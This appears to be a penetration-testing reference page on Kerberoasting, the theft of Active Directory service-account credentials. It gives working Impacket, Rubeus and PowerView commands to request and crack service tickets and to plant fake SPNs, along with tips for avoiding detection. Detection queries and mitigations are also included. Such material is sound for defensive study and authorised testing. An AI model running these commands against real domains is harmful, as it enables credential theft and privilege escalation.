# Kerberoasting

## Overview

Kerberoasting is a post-exploitation attack that extracts service account credentials by requesting TGS tickets for services with registered SPNs. The service ticket is encrypted with the target service account's password hash, which can be cracked offline.

Requires valid domain credentials (any domain user can request service tickets for any SPN).

## TGS-REQ/TGS-REP Flow

```
Client (Authenticated User)         KDC (DC)
  │                                    │
  │  TGS-REQ                           │
  │  ├─ TGT (from AS-REP)             │
  │  ├─ Authenticator (session key)    │
  │  └─ SPN: MSSQLSvc/sql.domain.local│
  │ ─────────────────────────────────>│
  │                                    │
  │  KDC validates TGT                 │
  │  KDC looks up SPN in AD            │
  │  Finds account: svc_sql           │
  │  Encrypts service ticket with      │
  │  svc_sql's password hash           │
  │                                    │
  │  TGS-REP                           │
  │  ├─ Service Ticket                │
  │  │  (encrypted with svc_sql hash) │
  │  │  ← THIS IS THE TARGET          │
  │  └─ Session Key                   │
  │     (encrypted with TGT session)  │
  │ <─────────────────────────────────│
```

The service ticket contains:
- Service account PAC (with group memberships)
- Encrypted with service account's NT hash (RC4) or AES key
- Cannot be read by the client but can be captured and cracked offline

## Service Principal Names (SPNs)

SPNs are unique identifiers for service instances in AD. Format:

```
<service_class>/<host>[:<port>][/<service_name>]
```

Examples:
- `MSSQLSvc/sql01.domain.local:1433`
- `http/web.domain.local`
- `cifs/fileserver.domain.local`
- `ldap/dc01.domain.local`
- `TERMSRV/rdp.domain.local`

### Finding SPNs

```bash
# Impacket - enumerate all SPNs
GetUserSPNs.py domain.local/john:Passw0rd -dc-ip 192.168.1.10

# PowerView
Get-DomainUser -SPN

# PowerShell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

## Kerberoasting Commands

### Impacket GetUserSPNs.py (Linux)

```bash
# Basic - request RC4 ticket for all SPNs
GetUserSPNs.py domain.local/john:Passw0rd -dc-ip 192.168.1.10 -request -outputfile kerberoast_hashes.txt

# Request tickets and save in hashcat format
GetUserSPNs.py domain.local/john:Passw0rd -dc-ip 192.168.1.10 -request -format hashcat -outputfile hashes.txt

# Request for specific user only
GetUserSPNs.py domain.local/john:Passw0rd -dc-ip 192.168.1.10 -request -requested-ticket SPN

# Without output file (stdout)
GetUserSPNs.py -request -dc-ip 192.168.1.10 domain.local/john:Passw0rd
```

### Rubeus (Windows)

```powershell
# Basic kerberoast - request for all SPNs
Rubeus.exe kerberoast /outfile:krb_hashes.txt /nowrap

# Kerberoast specific user
Rubeus.exe kerberoast /user:svc_sql /domain:domain.local /nowrap

# RC4 opsec - only request RC4-encrypted tickets (avoid AES)
Rubeus.exe kerberoast /rc4opsec /tgtdeleg /nowrap

# Using TGT delegation delegation (no local creds needed)
Rubeus.exe kerberoast /tgtdeleg /nowrap

# Specific SPN
Rubeus.exe kerberoast /spn:"MSSQLSvc/sql.domain.local" /nowrap

# Output hashcat format
Rubeus.exe kerberoast /format:hashcat /outfile:krb_hashes.txt
```

### Alternative Methods

```powershell
# PowerView (obsolete but works)
Request-SPNTicket -SPN "MSSQLSvc/sql.domain.local" -Format Hashcat

# Invoke-Kerberoast (PowerShell)
Invoke-Kerberoast -OutputFormat Hashcat | fl
```

## Encryption Types and OPSEC

### Ticket Encryption Types

| etype | Type | Hashcat Mode | Notes |
|-------|------|--------------|-------|
| 23 | RC4-HMAC (MD5) | `13100` | Weakest, fastest to crack |
| 17 | AES128-CTS-HMAC-SHA1 | `19600` | Stronger |
| 18 | AES256-CTS-HMAC-SHA1 | `19600` | Strongest |

### Rubeus /rc4opsec Flag

The `/rc4opsec` flag forces the KDC to return an RC4-encrypted ticket instead of AES. This works when:
1. The attacker has a TGT with a session key that uses RC4
2. The attacker requests the TGS using `/tgtdeleg` (which leverages Kerberos delegation to get an RC4 TGT)

```powershell
# OPSEC-safe kerberoasting (forces RC4 tickets)
Rubeus.exe kerberoast /rc4opsec /tgtdeleg /nowrap
```

### Why RC4 Matters

- RC4 (`-m 13100`) cracks **much faster** than AES (`-m 19600`) in hashcat
- Modern Windows defaults to AES, so without `/rc4opsec`, tickets returned are often AES-256
- `/rc4opsec` makes the KDC fall back to RC4 by presenting a TGT that only has RC4 keys

## Targeted Kerberoasting

### Setting a Fake SPN

If you have `GenericWrite` or `GenericAll` permissions on a target user, you can set a fake SPN and then Kerberoast them.

```powershell
# PowerView - set a fake SPN on a target user
Set-DomainObject -Identity targetuser -SET @{serviceprincipalname='http/fakespn'}

# PowerView - remove fake SPN (after roasting)
Set-DomainObject -Identity targetuser -Clear serviceprincipalname

# PowerShell AD module
Set-ADUser -Identity targetuser -Add @{ServicePrincipalName='http/fakespn'}
```

### Who Can Set SPNs

- Domain Admins
- Account Operators
- Users with `Validated-SPN` extended right
- Users with `GenericWrite`/`GenericAll` on the target

### Detection of Targeted Kerberoasting

- Event 5136: Directory Service Change (SPN attribute modified)
- Event 4769: TGS requested for a newly-added SPN
- Compare SPN addition time with TGS request time

## Cracking Kerberos Tickets

### Hash Formats

**RC4 (etype 23) - Hashcat mode 13100:**
```
$krb5tgs$23$*user$domain$spn*$HEX_CIPHER
```

**AES (etype 17/18) - Hashcat mode 19600:**
```
$krb5tgs$18$*user$domain$spn*$HEX_SALT$HEX_CIPHER
```

### Cracking Commands

```bash
# RC4 tickets (mode 13100)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt -r best64.rule rockyou.txt

# AES tickets (mode 19600)
hashcat -m 19600 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Show cracked hashes
hashcat -m 13100 kerberoast_hashes.txt --show
hashcat -m 19600 kerberoast_hashes.txt --show
```

### John

```bash
john --format=krb5tgs kerberoast_hashes.txt --wordlist=rockyou.txt
```

## OPSEC Considerations

| Aspect | Consideration |
|--------|---------------|
| **Event 4769** | Every TGS request generates event 4769 - the most obvious detection point |
| **Encryption type in log** | Event 4769 logs the encryption type used (RC4 vs AES) |
| **Volume** | Requesting many TGS in sequence is suspicious |
| **Source IP** | DC logs the client IP making the request |
| **Account name** | The user performing the TGS request is logged |
| **/rc4opsec** | Forces RC4, but older encryption type may be flagged |
| **SPN list** | Enumerating SPNs before requesting (LDAP query changes) |
| **Ticket size** | RC4 tickets are smaller than AES tickets |

### OPSEC Tips

1. **Space out requests** - Request one TGS every few minutes instead of all at once
2. **Use a compromised user's workstation** - Requests from a domain-joined machine look more legitimate
3. **Avoid enumeration** - Use known SPNs or target specific high-value accounts
4. **Use /tgtdeleg** - Rubeus `/tgtdeleg` obtains a TGT without leaving credentials in memory
5. **Clean up fake SPNs** - If doing targeted kerberoasting, remove the SPN afterward

## Detection

### Event 4769 - Kerberos Service Ticket Requested

Key fields to monitor:
- **Account Name**: The user who requested the TGS
- **Service Name**: The SPN being requested
- **Encryption Type**: `0x17` (RC4) indicated suspicious if unusual
- **Client Address**: Source IP
- **Ticket Options**: Forwarded, renewable flags

### Detection Rules

```kusto
// KQL - Detect Kerberoasting
EventID: 4769
| where EncryptionType == "0x17"  // RC4
| where ServiceName != "krbtgt"
| where AccountName != "$MachineName$"
| summarize RequestCount = count() by AccountName, ClientAddress, bin(TimeGenerated, 1h)
| where RequestCount > 10
```

```powershell
# PowerShell - Find accounts with SPNs (potential targets)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Detect high volume of TGS requests
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769} |
    Where-Object { $_.Properties[1].Value -ne 'krbtgt' } |
    Group-Object { $_.Properties[1].Value } |
    Where-Object Count -gt 10
```

### Event 5136 - Directory Service Change

When an SPN is added (targeted kerberoasting), event 5136 is generated:
- **Attribute**: `servicePrincipalName`
- **Old Value**: (empty or prior value)
- **New Value**: The fake SPN

### Indicators of Compromise

- High volume of 4769 events from a single user (especially with different SPNs)
- 4769 events with RC4 encryption type from a user that normally uses AES
- SPN additions followed immediately by TGS requests for that SPN
- TGS requests from non-domain-joined machines

## Mitigations

1. **Use strong, complex passwords** on service accounts (120+ bits of entropy)
2. **Use Managed Service Accounts (MSA/gMSA)** - automatic 120-character password rotation
3. **Use Group Managed Service Accounts (gMSA)** - same benefit, applicable to multiple servers
4. **Set SPN to accounts with strong passwords only**
5. **Limit service account privileges** (don't put them in Domain Admins)
6. **Use AES only** (disable RC4 via Group Policy) - harder to crack
7. **Monitor** event 4769 for anomalous TGS request patterns
8. **Consider using** "Kerberos armoring" (FAST) for additional protection
9. **Regularly rotate** service account passwords (or use gMSAs)

## References

- Attack described by Tim Medin (DerbyCon 2014)
- MS-SPNG: Service Principal Name
- MS-KILE: Kerberos Protocol Extensions
